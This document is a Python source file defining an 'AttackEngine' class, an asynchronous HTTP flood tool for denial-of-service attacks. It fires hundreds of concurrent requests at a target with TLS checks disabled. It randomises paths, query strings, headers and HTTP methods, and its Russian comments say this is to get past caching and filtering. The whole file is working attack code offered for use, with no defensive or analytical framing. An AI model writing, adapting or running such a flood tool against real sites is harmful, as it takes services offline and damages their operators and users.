import asyncio
import aiohttp
import ssl
from concurrent.futures import ThreadPoolExecutor
import random
import time

class AttackEngine:
    def __init__(self, max_threads=500, timeout=3):
        self.max_threads = max_threads
        self.timeout = timeout
        self.executor = ThreadPoolExecutor(max_workers=max_threads)
        self.running = False

    async def send_request(self, session, url, method='GET', data=None, headers=None):
        try:
            async with session.request(method, url, data=data, headers=headers, timeout=self.timeout, ssl=False) as resp:
                return resp.status
        except:
            return 0

    async def single_attack(self, target, count, method='GET', payload=None):
        self.running = True
        url = f"http://{target}" if not target.startswith('http') else target
        if not target.startswith('http'):
            url = f"http://{target}"

        # Подмешиваем случайные заголовки для обхода
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }

        conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
        async with aiohttp.ClientSession(connector=conn, headers=base_headers) as session:
            tasks = []
            for i in range(count):
                if not self.running:
                    break
                # Рандомизируем путь и параметры для обхода кеша
                rand_path = f"/{random.randint(1,999999)}?t={int(time.time())}&r={random.random()}"
                full_url = url + rand_path
                # Методы вразнобой
                methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'PATCH']
                m = method if method != 'ALL' else random.choice(methods)
                tasks.append(self.send_request(session, full_url, m, data=payload, headers={'X-Random': str(random.randint(1,99999))}))
                if len(tasks) >= self.max_threads:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)
        self.running = False

    def stop(self):
        self.running = False
